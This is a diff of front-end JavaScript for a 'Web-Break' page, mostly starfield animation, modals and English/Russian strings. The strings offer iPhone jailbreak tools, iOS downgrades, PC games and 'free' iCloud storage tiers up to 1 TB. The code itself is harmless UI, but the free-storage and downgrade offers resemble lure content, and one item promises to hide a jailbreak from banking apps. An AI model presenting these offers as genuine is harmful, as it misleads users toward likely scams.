+    const starCanvas = document.getElementById('stars-canvas');
+    let setStarfieldColor = () => {};
+    let boostStarfield = () => {};
+
+    const isLowPerfDevice = (
+      (typeof navigator.hardwareConcurrency === 'number' && navigator.hardwareConcurrency <= 4) ||
+      (typeof navigator.deviceMemory === 'number' && navigator.deviceMemory <= 4) ||
+      window.innerWidth < 640
+    );
+    if (isLowPerfDevice) {
+      document.documentElement.classList.add('low-perf');
+    } else {
+      document.documentElement.classList.remove('low-perf');
+    }
+
+    if (starCanvas && !prefersReducedMotion) {
+      const STAR_COLOR = '#fff';
+      const STAR_SIZE = isLowPerfDevice ? 2 : 2.4;
+      const STAR_MIN_SCALE = 0.2;
+      const OVERFLOW_THRESHOLD = 50;
+      const STAR_BASE_Z = isLowPerfDevice ? 0.00032 : 0.00042;
+      const STAR_FRAME_MIN_MS = isLowPerfDevice ? 22 : 16;
+
+      const context = starCanvas.getContext('2d', { alpha: true });
+      if (context) {
+        let starColor = STAR_COLOR;
+        let scale = 1;
+        let width = 0;
+        let height = 0;
+        let pointerX = null;
+        let pointerY = null;
+        let touchInput = false;
+        let stars = [];
+        let resizeTimer = 0;
+        let lastPointerAt = 0;
+        let animationId = 0;
+        let lastFrameAt = 0;
+        let starfieldRunning = false;
+        let speedWarp = 0;
+        let velocity = { x: 0, y: 0, tx: 0, ty: 0, z: STAR_BASE_Z };
+
+      function generateStars() {
+        const baseCount = Math.round((window.innerWidth + window.innerHeight) / (isLowPerfDevice ? 20 : 14));
+        const starCount = Math.min(
+          window.innerWidth < 640 ? (isLowPerfDevice ? 72 : 96) : (isLowPerfDevice ? 128 : 180),
+          Math.max(isLowPerfDevice ? 52 : 70, baseCount)
+        );
+        stars = [];
+
+        for (let i = 0; i < starCount; i++) {
+          stars.push({
+            x: 0,
+            y: 0,
+            z: STAR_MIN_SCALE + Math.random() * (1 - STAR_MIN_SCALE),
+            alpha: 0.45 + Math.random() * 0.34
+          });
+        }
+      }
+
+      function placeStar(star) {
+        star.x = Math.random() * width;
+        star.y = Math.random() * height;
+      }
+
+      function recycleStar(star) {
+        let direction = 'z';
+        const vx = Math.abs(velocity.x);
+        const vy = Math.abs(velocity.y);
+
+        if (vx > 1 || vy > 1) {
+          let axis;
+
+          if (vx > vy) {
+            axis = Math.random() < vx / (vx + vy) ? 'h' : 'v';
+          } else {
+            axis = Math.random() < vy / (vx + vy) ? 'v' : 'h';
+          }
+
+          if (axis === 'h') {
+            direction = velocity.x > 0 ? 'l' : 'r';
+          } else {
+            direction = velocity.y > 0 ? 't' : 'b';
+          }
+        }
+
+        star.z = STAR_MIN_SCALE + Math.random() * (1 - STAR_MIN_SCALE);
+
+        if (direction === 'z') {
+          star.z = 0.1;
+          star.x = Math.random() * width;
+          star.y = Math.random() * height;
+        } else if (direction === 'l') {
+          star.x = -OVERFLOW_THRESHOLD;
+          star.y = height * Math.random();
+        } else if (direction === 'r') {
+          star.x = width + OVERFLOW_THRESHOLD;
+          star.y = height * Math.random();
+        } else if (direction === 't') {
+          star.x = width * Math.random();
+          star.y = -OVERFLOW_THRESHOLD;
+        } else if (direction === 'b') {
+          star.x = width * Math.random();
+          star.y = height + OVERFLOW_THRESHOLD;
+        }
+      }
+
+      function resizeStars() {
+        scale = Math.min(window.devicePixelRatio || 1, isLowPerfDevice ? 1.15 : 1.35);
+        width = window.innerWidth * scale;
+        height = window.innerHeight * scale;
+        starCanvas.width = width;
+        starCanvas.height = height;
+        generateStars();
+        stars.forEach(placeStar);
+      }
+
+      function updateStars() {
+        speedWarp *= 0.92;
+        const driftScale = 1 + speedWarp;
+        const zVelocity = STAR_BASE_Z + (speedWarp * (isLowPerfDevice ? 0.00018 : 0.00028));
+
+        velocity.tx *= 0.96;
+        velocity.ty *= 0.96;
+        velocity.x += (velocity.tx - velocity.x) * 0.8;
+        velocity.y += (velocity.ty - velocity.y) * 0.8;
+        velocity.z = zVelocity;
+
+        stars.forEach((star) => {
+          star.x += velocity.x * star.z * driftScale;
+          star.y += velocity.y * star.z * driftScale;
+          star.x += (star.x - width / 2) * velocity.z * star.z;
+          star.y += (star.y - height / 2) * velocity.z * star.z;
+          star.z += velocity.z;
+
+          if (
+            star.x < -OVERFLOW_THRESHOLD ||
+            star.x > width + OVERFLOW_THRESHOLD ||
+            star.y < -OVERFLOW_THRESHOLD ||
+            star.y > height + OVERFLOW_THRESHOLD
+          ) {
+            recycleStar(star);
+          }
+        });
+      }
+
+      function renderStars() {
+        context.clearRect(0, 0, width, height);
+        context.lineCap = 'round';
+        context.strokeStyle = starColor;
+
+        stars.forEach((star) => {
+          context.lineWidth = STAR_SIZE * star.z * scale;
+          context.globalAlpha = star.alpha;
+          context.beginPath();
+          context.moveTo(star.x, star.y);
+
+          let tailX = velocity.x * (2 + speedWarp * 2.4);
+          let tailY = velocity.y * (2 + speedWarp * 2.4);
+
+          if (Math.abs(tailX) < 0.1) tailX = 0.5;
+          if (Math.abs(tailY) < 0.1) tailY = 0.5;
+
+          context.lineTo(star.x + tailX, star.y + tailY);
+          context.stroke();
+        });
+      }
+
+      function stepStars(now = 0) {
+        if (!starfieldRunning) return;
+        if (now - lastFrameAt < STAR_FRAME_MIN_MS) {
+          animationId = requestAnimationFrame(stepStars);
+          return;
+        }
+
+        lastFrameAt = now;
+        updateStars();
+        renderStars();
+        animationId = requestAnimationFrame(stepStars);
+      }
+
+      function movePointer(x, y) {
+        const scaledX = x * scale;
+        const scaledY = y * scale;
+
+        if (typeof pointerX === 'number' && typeof pointerY === 'number') {
+          const ox = scaledX - pointerX;
+          const oy = scaledY - pointerY;
+
+          velocity.tx += (ox / (8 * scale)) * (touchInput ? 1 : -1);
+          velocity.ty += (oy / (8 * scale)) * (touchInput ? 1 : -1);
+        }
+
+        pointerX = scaledX;
+        pointerY = scaledY;
+      }
+
+      function onPointerMove(event) {
+        const now = performance.now();
+        if (now - lastPointerAt < 16) return;
+        lastPointerAt = now;
+
+        touchInput = event.pointerType === 'touch';
+        movePointer(event.clientX, event.clientY);
+      }
+
+      function onMouseLeave() {
+        pointerX = null;
+        pointerY = null;
+      }
+
+      setStarfieldColor = (color) => {
+        starColor = color || STAR_COLOR;
+      };
+
+      boostStarfield = (intensity = 1) => {
+        const boost = Math.max(0.45, intensity);
+        speedWarp = Math.max(speedWarp, isLowPerfDevice ? 0.55 * boost : 0.95 * boost);
+        velocity.tx += 0.95 * boost;
+        velocity.ty -= 0.55 * boost;
+      };
+
+      function startStarfield() {
+        if (starfieldRunning) return;
+        starfieldRunning = true;
+        lastFrameAt = 0;
+        animationId = requestAnimationFrame(stepStars);
+      }
+
+      function stopStarfield() {
+        starfieldRunning = false;
+        cancelAnimationFrame(animationId);
+      };
+
+      function scheduleResizeStars() {
+        window.clearTimeout(resizeTimer);
+        resizeTimer = window.setTimeout(resizeStars, 120);
+      }
+
+      function handleVisibilityChange() {
+        if (document.hidden) {
+          stopStarfield();
+          return;
+        }
+
+        startStarfield();
+      }
+
+      resizeStars();
+      startStarfield();
+      window.addEventListener('resize', scheduleResizeStars, { passive: true });
+      window.addEventListener('pointermove', onPointerMove, { passive: true });
+      document.addEventListener('mouseleave', onMouseLeave, { passive: true });
+      document.addEventListener('pointercancel', onMouseLeave, { passive: true });
+      document.addEventListener('visibilitychange', handleVisibilityChange, { passive: true });
+      }
+    }
+
+    // 2. Info & Language Modal Logic
+    const infoBtn = document.getElementById('info-btn');
+    const infoModal = document.getElementById('info-modal');
+    const infoContent = document.getElementById('info-content');
+    const infoBackdrop = document.getElementById('info-backdrop');
+    const infoCloseBtn = document.getElementById('info-close-btn');
+    const shareBtn = document.getElementById('share-btn');
+    const shareToast = document.getElementById('share-toast');
+    const shareToastText = document.getElementById('share-toast-text');
+    let shareToastTimer = null;
+
+    const langBtn = document.getElementById('lang-btn');
+    const langModal = document.getElementById('lang-modal');
+    const langContent = document.getElementById('lang-content');
+    const langBackdrop = document.getElementById('lang-backdrop');
+    const langCloseBtn = document.getElementById('lang-close-btn');
+
+    function openInfo() {
+      if (!infoModal || !infoContent || !infoBtn) return;
+      infoModal.classList.remove('pointer-events-none', 'opacity-0');
+      infoContent.classList.remove('scale-95', 'opacity-0');
+      infoContent.classList.add('scale-100', 'opacity-100');
+      document.body.classList.add('modal-open');
+      infoBtn.setAttribute('aria-expanded', 'true');
+    }
+
+    function closeInfo() {
+      if (!infoModal || !infoContent || !infoBtn) return;
+      infoModal.classList.add('pointer-events-none', 'opacity-0');
+      infoContent.classList.remove('scale-100', 'opacity-100');
+      infoContent.classList.add('scale-95', 'opacity-0');
+      document.body.classList.remove('modal-open');
+      infoBtn.setAttribute('aria-expanded', 'false');
+    }
+
+    function openLang() {
+      if (!langModal || !langContent || !langBtn) return;
+      langModal.classList.remove('pointer-events-none', 'opacity-0');
+      langContent.classList.remove('scale-95', 'opacity-0');
+      langContent.classList.add('scale-100', 'opacity-100');
+      document.body.classList.add('modal-open');
+      langBtn.setAttribute('aria-expanded', 'true');
+    }
+
+    function closeLang() {
+      if (!langModal || !langContent || !langBtn) return;
+      langModal.classList.add('pointer-events-none', 'opacity-0');
+      langContent.classList.remove('scale-100', 'opacity-100');
+      langContent.classList.add('scale-95', 'opacity-0');
+      document.body.classList.remove('modal-open');
+      langBtn.setAttribute('aria-expanded', 'false');
+    }
+
+    function showShareToast() {
+      if (!shareToast) return;
+      window.clearTimeout(shareToastTimer);
+      shareToast.classList.add('show');
+      shareToastTimer = window.setTimeout(() => {
+        shareToast.classList.remove('show');
+      }, 2200);
+    }
+
+    async function copyShareLink() {
+      const shareUrl = 'https://web.archive.org/web/20260503211418/https://vityaig.github.io/26jailbreak.html';
+
+      try {
+        if (navigator.clipboard && typeof navigator.clipboard.writeText === 'function') {
+          await navigator.clipboard.writeText(shareUrl);
+        } else {
+          const textArea = document.createElement('textarea');
+          textArea.value = shareUrl;
+          textArea.setAttribute('readonly', '');
+          textArea.style.position = 'fixed';
+          textArea.style.opacity = '0';
+          document.body.appendChild(textArea);
+          textArea.select();
+          document.execCommand('copy');
+          textArea.remove();
+        }
+        showShareToast();
+      } catch (_) {}
+    }
+
+    if (infoBtn && infoCloseBtn && infoBackdrop) {
+      infoBtn.addEventListener('click', openInfo);
+      infoCloseBtn.addEventListener('click', closeInfo);
+      infoBackdrop.addEventListener('click', closeInfo);
+    }
+
+    if (langBtn && langCloseBtn && langBackdrop) {
+      langBtn.addEventListener('click', openLang);
+      langCloseBtn.addEventListener('click', closeLang);
+      langBackdrop.addEventListener('click', closeLang);
+    }
+
+    if (shareBtn) {
+      shareBtn.addEventListener('click', copyShareLink);
+    }
+
+    document.addEventListener('keydown', (event) => {
+      if (event.key !== 'Escape') return;
+      closeInfo();
+      closeLang();
+    });
+
+    // Translations
+    const translations = {
+      en: {
+        systemReady: "Device Compatible",
+        systemNotSupported: "Device Not Compatible",
+        heroTitle: "Let's Get Started",
+        tabJailbreak: "Jailbreak",
+        tabDowngrade: "iOS Downgrade",
+        tabPcGames: "PC Games / Apps",
+        tabIcloud: "Free iCloud Storage",
+        btnContinue: 'Continue <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinueJailbreak: 'Continue to Installation <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinueDowngrade: 'Continue to Downgrade <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinuePcGames: 'Continue to App Setup <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinueIcloud: 'Continue to iCloud Setup <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnJailbreak: "Start Installation",
+        btnDowngrade: "Start Downgrade",
+        btnIcloud: "Get Storage",
+        btnClose: "Close",
+        langTitle: "Language",
+        yourOption: "You selected:",
+        iosAvailable: "Available for iOS",
+        raveDownloadAvailable: "Available for download",
+        recommendedLabel: "Recommended",
+        exclusiveLabel: "Exclusive",
+        categorySpotlight: {
+          jailbreak: {
+            title: "Jailbreak Tools",
+            description: "Choose the toolset you want to launch, then continue to the installation step.",
+            tags: ["Core tools", "App signing", "Packages"]
+          },
+          downgrade: {
+            title: "Downgrade Library",
+            description: "Choose the rollback version that best fits your device, preferred stability, and iOS generation.",
+            tags: ["Stable", "Recommended", "Archive"]
+          },
+          pcgames: {
+            title: "PC Games / Apps",
+            description: "Browse desktop titles and apps with a matching visual setup and direct install flow.",
+            tags: ["Games", "Apps", "Downloads"]
+          },
+          icloud: {
+            title: "Free iCloud Storage",
+            description: "Choose the storage tier you want to unlock and continue to the activation step.",
+            tags: ["Cloud+", "Rainbow tiers", "Extra space"]
+          }
+        },
+        downgradeTrack: {
+          latest: "Current Branch",
+          stable: "Stable",
+          balanced: "Balanced",
+          exclusive: "Archive"
+        },
+        stepSelect: "Step 1 - Select",
+        stepLaunch: "Step 2 - Launch",
+        infoPill: "Concept Build",
+        infoDesc: "A polished Web-Break interface with guided choices, adaptive visuals, and a clean launch flow.",
+        version: "Version",
+        compatibility: "Compatibility",
+        interfaceLabel: "Interface",
+        aboutFeatureFlow: "Guided flow for tools, rollback, and apps.",
+        aboutFeatureTheme: "Theme color adapts to the selected option.",
+        aboutFeatureIcons: "Real icons are used where reliable sources exist.",
+        shareLabel: "Share",
+        shareToast: "Thank You! Link Copied",
+        viewCredits: "View Credits",
+        hideCredits: "Hide Credits",
+        creditsTitle: "Credits",
+        roleDesigner: "Lead Designer & Concept Author",
+        roleAi: "AI Engineering & Code Generation",
+        roleInfra: "Infrastructure & Sub-domain Provisioning",
+        roleExecution: "Browser-to-SpringBoard Execution Logic (Respring)",
+        items: {
+          dopamine: { title: "Install Dopamine", description: "Rootless jailbreak setup for modern supported iOS versions." },
+          trollstore: { title: "Install TrollStore", description: "Permanent app signing for sideloaded apps without regular certificate revokes." },
+          sileo: { title: "Install Sileo", description: "Clean package manager for tweaks, repos, and essentials." },
+          roothide: { title: "Enable RootHide", description: "Reduce jailbreak detection in banking and game apps." },
+          dg_26_0_1: { title: "Downgrade to iOS 26.0.1", description: "Newest branch with Lara-based rollback support." },
+          dg_17_0: { title: "Downgrade to iOS 17.0", description: "Exclusive archive build for early iOS 17 compatibility testing." },
+          dg_16_5_1: { title: "Downgrade to iOS 16.5.1", description: "Exclusive legacy build for older rootless workflows and app support." },
+          dg_18_7_1: { title: "Downgrade to iOS 18.7.1", description: "Clean iOS 18 build for users who want a familiar stable release." },
+          dg_18_5: { title: "Downgrade to iOS 18.5", description: "Best all-around rollback version for stability and tweak support." },
+          dg_18_3_1: { title: "Downgrade to iOS 18.3.1", description: "Older iOS 18 build with broad compatibility and lighter visuals." },
+          pc_gta5: { title: "Grand Theft Auto V", description: "Open-world action with story missions and online play." },
+          pc_minecraft: { title: "Minecraft", description: "Build, craft, survive, and play with friends." },
+          pc_rdr2: { title: "Red Dead Redemption 2", description: "Story-driven western adventure in a huge open world." },
+          pc_rave: { title: "Rave", description: "Watch videos and streams together with friends." },
+          pc_ayugram: { title: "AyuGram", description: "Telegram mod with extra privacy tools, UI customization, recall history, and flexible chat controls." },
+          pc_nugget: { title: "Nugget Mobile", description: "Tweak toolkit for iOS 26.4.2 and earlier with Dynamic Island, hidden flags, and extra system options. <span class=\"desc-accent-purple\">Supports animated wallpapers.</span>" },
+          icloud_32: { title: "32 GB iCloud", description: "Entry cloud storage tier for light backups and extra files." },
+          icloud_64: { title: "64 GB iCloud", description: "Balanced cloud plan for photos, backups, and daily storage." },
+          icloud_128: { title: "128 GB iCloud", description: "Expanded cloud tier for larger media libraries and device backups." },
+          icloud_256: { title: "256 GB iCloud", description: "High-capacity storage for photos, videos, and long-term syncing." },
+          icloud_512: { title: "512 GB iCloud", description: "Large storage plan for heavy media use and multiple backups." },
+          icloud_1tb: { title: "1 TB iCloud", description: "Maximum rainbow tier for full cloud libraries and oversized backups." }
+        }
+      },
+      ru: {
+        systemReady: "Система поддерживается",
+        systemNotSupported: "Система не поддерживается",
+        heroTitle: "Давайте начнем",
+        tabJailbreak: "Джейлбрейк",
+        tabDowngrade: "Откат iOS",
+        tabPcGames: "ПК Игры / Приложения",
+        tabIcloud: "Бесплатная память iCloud",
+        btnContinue: 'Продолжить <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinueJailbreak: 'Перейти к установке <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinueDowngrade: 'Перейти к откату iOS <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinuePcGames: 'Перейти к установке приложения <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnContinueIcloud: 'Перейти к памяти iCloud <i data-lucide="arrow-right" class="w-5 h-5 transition-transform group-hover:translate-x-1"></i>',
+        btnJailbreak: "Начать установку",
+        btnDowngrade: "Откатить",
+        btnIcloud: "Получить хранилище",
+        btnClose: "Закрыть",
+        langTitle: "Язык",
+        yourOption: "Вы выбрали:",
+        iosAvailable: "Доступно для iOS",
+        raveDownloadAvailable: "Доступно к скачиванию",
+        recommendedLabel: "Рекомендуется",
+        exclusiveLabel: "Эксклюзив",
+        categorySpotlight: {
+          jailbreak: {
+            title: "Инструменты джейлбрейка",
+            description: "Выберите нужный инструмент и перейдите к шагу установки.",
+            tags: ["Основное", "Подпись IPA", "Пакеты"]
+          },
+          downgrade: {
+            title: "Каталог отката iOS",
+            description: "Выберите версию отката под свое устройство, нужную стабильность и поколение iOS.",
+            tags: ["Стабильно", "Рекомендуется", "Архив"]
+          },
+          pcgames: {
+            title: "ПК Игры / Приложения",
+            description: "Каталог настольных игр и приложений с отдельным визуальным стилем и прямым сценарием установки.",
+            tags: ["Игры", "Приложения", "Загрузки"]
+          },
+          icloud: {
+            title: "Бесплатная память iCloud",
+            description: "Выберите объем памяти, который хотите активировать, и перейдите к следующему шагу.",
+            tags: ["Cloud+", "Радужные объемы", "Больше места"]
+          }
+        },
+        downgradeTrack: {
+          latest: "Текущая ветка",
+          stable: "Стабильная",
+          balanced: "Сбалансированная",
+          exclusive: "Архивная"
+        },
+        stepSelect: "Шаг 1 - Выбор",
+        stepLaunch: "Шаг 2 - Запуск",
+        infoPill: "Концепт-сборка",
+        infoDesc: "Аккуратный интерфейс Web-Break с понятным выбором, адаптивной визуальной темой и чистым запуском.",
+        version: "Версия",
+        compatibility: "Совместимость",
+        interfaceLabel: "Интерфейс",
+        aboutFeatureFlow: "Пошаговый выбор для инструментов, отката и приложений.",
+        aboutFeatureTheme: "Цвет темы подстраивается под выбранную опцию.",
+        aboutFeatureIcons: "Реальные иконки используются там, где есть надежные источники.",
+        shareLabel: "Поделиться",
+        shareToast: "Спасибо! Ссылка скопирована",
+        viewCredits: "Показать создателей",
+        hideCredits: "Скрыть создателей",
+        creditsTitle: "Создатели",
+        roleDesigner: "Главный дизайнер и автор идеи",
+        roleAi: "ИИ-разработка и генерация кода",
+        roleInfra: "Инфраструктура и настройка поддоменов",
+        roleExecution: "Логика запуска Browser-to-SpringBoard (Respring)",
+        items: {
+          dopamine: { title: "Установить Dopamine", description: "Rootless-установка джейлбрейка для современных поддерживаемых версий iOS." },
+          trollstore: { title: "Установить TrollStore", description: "Постоянная подпись sideload-приложений без регулярных отзывов сертификата." },
+          sileo: { title: "Установить Sileo", description: "Аккуратный менеджер пакетов для твиков, репозиториев и базовых инструментов." },
+          roothide: { title: "Включить RootHide", description: "Снижает обнаружение джейлбрейка в банковских и игровых приложениях." },
+          dg_26_0_1: { title: "Откат на iOS 26.0.1", description: "Самая новая ветка с Lara-поддержкой для отката." },
+          dg_17_0: { title: "Откат на iOS 17.0", description: "Эксклюзивная архивная сборка для ранней совместимости с iOS 17." },
+          dg_16_5_1: { title: "Откат на iOS 16.5.1", description: "Эксклюзивная legacy-сборка для старых rootless-сценариев и приложений." },
+          dg_18_7_1: { title: "Откат на iOS 18.7.1", description: "Чистая сборка iOS 18 для тех, кому нужна привычная стабильная версия." },
+          dg_18_5: { title: "Откат на iOS 18.5", description: "Самая универсальная версия отката по стабильности и поддержке твиков." },
+          dg_18_3_1: { title: "Откат на iOS 18.3.1", description: "Более ранняя сборка iOS 18 с широкой совместимостью и легкой визуальной нагрузкой." },
+          pc_gta5: { title: "Grand Theft Auto V", description: "Экшен с открытым миром, сюжетом и онлайн-режимом." },
+          pc_minecraft: { title: "Minecraft", description: "Песочница с выживанием, строительством и крафтом." },
+          pc_rdr2: { title: "Red Dead Redemption 2", description: "Вестерн-приключение с сюжетом и открытым миром." },
+          pc_rave: { title: "Rave", description: "Совместный просмотр видео и стримов с друзьями." },
+          pc_ayugram: { title: "AyuGram", description: "Модификация Telegram с расширенными настройками приватности, внешнего вида, историей удалений и гибким управлением чатами." },
+          pc_nugget: { title: "Nugget Mobile", description: "Набор твиков для iOS 26.4.2 и ниже с Dynamic Island, скрытыми флагами и дополнительными системными настройками. <span class=\"desc-accent-purple\">Можно ставить анимированные обои.</span>" },
+          icloud_32: { title: "32 ГБ iCloud", description: "Базовый объем для легких резервных копий и дополнительных файлов." },
+          icloud_64: { title: "64 ГБ iCloud", description: "Сбалансированный объем для фото, бэкапов и повседневного хранения." },
+          icloud_128: { title: "128 ГБ iCloud", description: "Расширенный объем для больших медиатек и резервных копий устройства." },
+          icloud_256: { title: "256 ГБ iCloud", description: "Большой объем для фото, видео и долгой синхронизации." },
+          icloud_512: { title: "512 ГБ iCloud", description: "Очень большой объем для тяжелых медиафайлов и нескольких бэкапов." },
+          icloud_1tb: { title: "1 ТБ iCloud", description: "Максимальный радужный уровень для полной облачной медиатеки и крупных резервных копий." }
+        }
+      }
+    };
+
+    let currentLang = 'en';
+    let heroTypingTimer = null;
+    const isSupportedOS = /iPhone|iPad|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+
+    function setHeroTitle(text) {
+      const heroTitle = document.getElementById('hero-title');
+      if (!heroTitle) return;
+
+      clearTimeout(heroTypingTimer);
+      heroTitle.setAttribute('aria-label', text);
+
+      if (prefersReducedMotion) {
+        heroTitle.classList.remove('typing');
+        heroTitle.textContent = text;
+        return;
+      }
+
+      const chars = Array.from(text);
+      let index = 0;
+      heroTitle.textContent = '';
+      heroTitle.classList.add('typing');
+
+      function typeNextChar() {
+        heroTitle.textContent = chars.slice(0, index).join('');
+        index += 1;
+
+        if (index <= chars.length) {
+          heroTypingTimer = setTimeout(typeNextChar, 44);
+        } else {
+          heroTypingTimer = setTimeout(() => {
+            heroTitle.classList.remove('typing');
+          }, 900);
+        }
+      }
+
+      typeNextChar();
+    }
+
+    function updateMainButtonText() {
+      const t = translations[currentLang] || translations.en;
+      let label = t.btnJailbreak;
+      if (currentCategory === 'downgrade') {
+        label = t.btnDowngrade;
+      } else if (currentCategory === 'icloud') {
+        label = t.btnIcloud || t.btnJailbreak;
+      }
+      setNodeText('jb-btn-text', label);
+      updateMainButtonWidth();
+    }
+
+    function updateMainButtonWidth() {
+      const wrapper = document.getElementById('jb-btn-wrapper');
+      if (!wrapper) return;
+
+      wrapper.style.width = 'auto';
+      wrapper.style.maxWidth = currentCategory === 'downgrade'
+        ? 'calc(100vw - 2rem)'
+        : 'calc(100vw - 2rem)';
+    }
+
+    function updateContinueButtonText() {
+      const t = translations[currentLang] || translations.en;
+      let label = t.btnContinueJailbreak || t.btnContinue;
+      if (currentCategory === 'downgrade') {
+        label = t.btnContinueDowngrade || t.btnContinue;
+      } else if (currentCategory === 'pcgames') {
+        label = t.btnContinuePcGames || t.btnContinue;
+      } else if (currentCategory === 'icloud') {
+        label = t.btnContinueIcloud || t.btnContinue;
+      }
+      setNodeHTML('continue-btn', label);
+      safeCreateIcons();
+    }
+
+    function updateCategorySpotlight() {
+      const t = translations[currentLang] || translations.en;
+      const fallback = translations.en.categorySpotlight || {};
+      const section = (t.categorySpotlight && t.categorySpotlight[currentCategory]) || fallback[currentCategory];
+      if (!section) return;
+
+      setNodeText('category-spotlight-title-text', section.title || '');
+      setNodeText('category-spotlight-desc', section.description || '');
+
+      const tagsEl = document.getElementById('category-spotlight-tags');
+      if (!tagsEl) return;
+
+      const tags = Array.isArray(section.tags) ? section.tags : [];
+      tagsEl.innerHTML = tags.map((tag, index) => {
+        const extraClass = currentCategory === 'downgrade' && index === tags.length - 1 ? ' is-gold' : '';
+        return `<span class="category-spotlight-tag${extraClass}">${tag}</span>`;
+      }).join('');
+    }
+
+    function applyLanguageAnimated(lang) {
+      if (prefersReducedMotion) {
+        applyLanguage(lang);
+        return;
+      }
+
+      document.body.classList.add('language-swapping');
+      setTimeout(() => {
+        applyLanguage(lang);
+        requestAnimationFrame(() => {
+          document.body.classList.remove('language-swapping');
+        });
+      }, 120);
+    }
+
+    function applyLanguage(lang) {
+      const nextLang = Object.prototype.hasOwnProperty.call(translations, lang) ? lang : 'en';
+      currentLang = nextLang;
+      const t = translations[nextLang] || translations.en;
+      document.documentElement.lang = nextLang;
+      try {
+        localStorage.setItem('webbreak-lang', nextLang);
+      } catch (_) {}
+
+      const statusDot = document.getElementById('system-status-dot');
+      const statusTxt = document.getElementById('system-ready-txt');
+      
+      if (statusDot && statusTxt) {
+        if (isSupportedOS) {
+          statusTxt.innerText = t.systemReady;
+          statusDot.classList.add('bg-green-400', 'animate-pulse');
+          statusDot.classList.remove('bg-red-500');
+        } else {
+          statusTxt.innerText = t.systemNotSupported;
+          statusDot.classList.add('bg-red-500');
+          statusDot.classList.remove('bg-green-400', 'animate-pulse');
+        }
+      }
+      
+      setHeroTitle(t.heroTitle);
+      
+      if (typeof updateCategoryTabsUI === 'function') {
+        updateCategoryTabsUI();
+      }
+
+      updateContinueButtonText();
+      updateMainButtonText();
+      updateCategorySpotlight();
+      setNodeText('info-close-btn', t.btnClose);
+      setNodeText('lang-close-btn', t.btnClose);
+      setNodeText('lang-modal-title', t.langTitle);
+      setNodeText('jb-your-option-lbl', t.yourOption);
+      setNodeText('lang-btn-text', nextLang === 'en' ? 'EN' : 'RU');
+      setNodeText('step-label-1', t.stepSelect);
+      setNodeText('step-label-2', t.stepLaunch);
+      setNodeText('jb-step-label-1', t.stepSelect);
+      setNodeText('jb-step-label-2', t.stepLaunch);
+
+      setNodeHTML('info-pill', `<span class="w-1.5 h-1.5 rounded-full bg-green-400 animate-pulse"></span>${t.infoPill}`);
+      setNodeText('info-desc', t.infoDesc);
+      setNodeText('version-lbl', t.version);
+      setNodeText('compat-lbl', t.compatibility);
+      setNodeText('build-lbl', t.interfaceLabel);
+      setNodeText('about-feature-flow', t.aboutFeatureFlow);
+      setNodeText('about-feature-theme', t.aboutFeatureTheme);
+      setNodeText('about-feature-icons', t.aboutFeatureIcons);
+      setNodeText('share-btn-label', t.shareLabel);
+      setNodeText('share-toast-text', t.shareToast);
+      setNodeText('credits-title', t.creditsTitle);
+      setNodeText('role-designer', t.roleDesigner);
+      setNodeText('role-ai', t.roleAi);
+      setNodeText('role-infra', t.roleInfra);
+      setNodeText('role-execution', t.roleExecution);
+      
+      const creditsSection = document.getElementById('credits-section');
+      const viewCreditsLabel = document.querySelector('#view-credits-btn span');
+      if (creditsSection && !creditsSection.classList.contains('hidden')) {
+        if (viewCreditsLabel) viewCreditsLabel.textContent = t.hideCredits;
+      } else if (viewCreditsLabel) {
+        viewCreditsLabel.textContent = t.viewCredits;
+      }
+
+      // Re-render options to apply translations
+      if (typeof renderOptions === 'function') {
+        renderOptions(currentCategory);
+        
+        // Re-select previously selected option after re-rendering if it exists
+        if (selectedOptionId) {
+          const item = document.querySelector(`.option-item[data-id="${selectedOptionId}"]`);
+          if (item) {
+             item.classList.add('selected');
+             item.setAttribute('aria-pressed', 'true');
+             list.classList.add('has-selection');
+             continueBtnContainer.classList.add('visible');
+             continueBtn.setAttribute('aria-disabled', 'false');
+             continueBtn.disabled = false;
+          }
+          
+          // Also update the jailbreak screen selected value
+          const jbSelectedValue = document.getElementById('jb-selected-value');
+          if (jbSelectedValue && jbSelectedValue.innerHTML.trim() !== '') {
+            const selectedItemObj = DATA[currentCategory].find(o => o.id === selectedOptionId);
+            if (selectedItemObj) {
+              const mappedTitle = getLocalizedItem(currentLang, selectedItemObj).title;
+              const iconHTML = buildOptionIconHTML(selectedItemObj, mappedTitle, 'w-6 h-6', 'w-5 h-5');
+                
+              jbSelectedValue.innerHTML = `${iconHTML}<span class="text-base font-bold truncate drop-shadow-md" style="color: var(--theme-color, white);">${mappedTitle}</span>`;
+            }
+          }
+        }
+      }
+      safeCreateIcons();
+
+      // Update lang options UI
+      document.querySelectorAll('.lang-option').forEach(btn => {
+        const isSelected = btn.dataset.lang === nextLang;
+        const check = btn.querySelector('.lang-check');
+        const span = btn.querySelector('span');
+
+        if (!check || !span) return;
+
+        if (isSelected) {
+          btn.setAttribute('aria-pressed', 'true');
+          btn.classList.add('border-white/10', 'bg-white/5');
+          btn.classList.remove('border-transparent');
+          span.classList.remove('text-white/70');
+          span.classList.add('text-white');
+          check.classList.remove('hidden');
+        } else {
+          btn.setAttribute('aria-pressed', 'false');
+          btn.classList.remove('border-white/10', 'bg-white/5');
+          btn.classList.add('border-transparent');
+          span.classList.add('text-white/70');
+          span.classList.remove('text-white');
+          check.classList.add('hidden');
+        }
+      });
+    }
+
+    document.querySelectorAll('.lang-option').forEach(btn => {
+      btn.addEventListener('click', () => {
+        applyLanguageAnimated(btn.dataset.lang);
+        setTimeout(closeLang, 280);
+      });
+    });
+
+    const viewCreditsBtn = document.getElementById('view-credits-btn');
+    const creditsSection = document.getElementById('credits-section');
+    if (viewCreditsBtn && creditsSection) {
